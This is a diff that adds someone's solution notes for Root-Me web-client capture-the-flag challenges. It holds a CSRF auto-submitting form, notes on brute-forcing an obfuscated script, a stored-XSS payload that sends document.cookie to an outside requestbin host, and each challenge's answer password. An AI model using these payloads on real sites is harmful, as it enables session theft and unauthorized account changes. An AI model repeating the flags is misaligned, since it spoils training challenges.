@@ -1,0 +1,35 @@
+CSRF - 0 protection:
+    (Administrator, sjekker e-post hvert 2 minutt ca.)
+    17:28
+    <script>
+        var formData = new FormData();
+        formData.append("username", "asd");
+        formData.append("status", "on");
+        var request = new XMLHttpRequest();
+        request.open("POST", "http://challenge01.root-me.org/web-client/ch22/index.php?action=profile");
+        request.send(formData);
+    </script>
+    <body onload="asd()">
+    Password: Csrf_Fr33style-L3v3l1!
+
+JavaScript obfuscation 3:
+    run ob3.js
+    Password: 786OsErtk12
+
+JavaScript obfuscation 4:
+    ob4.js is a bruteforcer for it.
+    However it gives a lot of false positives:
+        MyP4cS
+        MyP4kS
+        MyP4sS
+        MyP4CS
+        MyP4KS
+        MyP4SS
+    Password: MyP4sS
+
+XSS - stored 1
+    http://requestbin.fullcontact.com/
+    to see http requests.
+    payload:
+        <body onload=document.location='http://requestbin.fullcontact.com/18z3p941?cookie=/'+document.cookie>
+    Password: NkI9qe4cdLIO2P7MIsWS8ofD6
